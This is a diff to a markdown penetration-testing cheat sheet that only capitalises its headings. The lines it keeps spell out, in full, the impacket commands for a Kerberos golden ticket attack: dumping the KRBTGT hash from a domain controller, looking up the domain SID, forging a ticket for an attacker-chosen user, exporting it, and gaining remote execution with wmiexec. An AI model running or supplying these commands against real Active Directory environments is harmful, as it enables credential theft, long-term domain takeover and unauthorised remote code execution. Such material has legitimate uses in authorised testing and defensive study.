@@ -1,24 +1,24 @@
-### get KRBTGT hash
+### Get KRBTGT hash
 ```
 impacket-secretsdump -just-dc <domain>/<user>:<password>@<rhost> -just-dc-user krbtgt
 ```
 
-### get Domain SID
+### Get Domain SID
 ```
 impacket-lookupsid <domain>/<user>:<password>@<rhost>
 ```
 
-### create ticket
+### Create ticket
 ```
 impacket-ticketer -nthash <ntlmHash> -domain-sid <sid> -domain <domain> <attackerUser>
 ```
 
-### export ticket
+### Export ticket
 ```
 export KRB5CCNAME=<ticketFile>
 ```
 
-### use ticket
+### Use ticket
 ```
 impacket-wmiexec -k -no-pass <fqdnRhost>
 ```
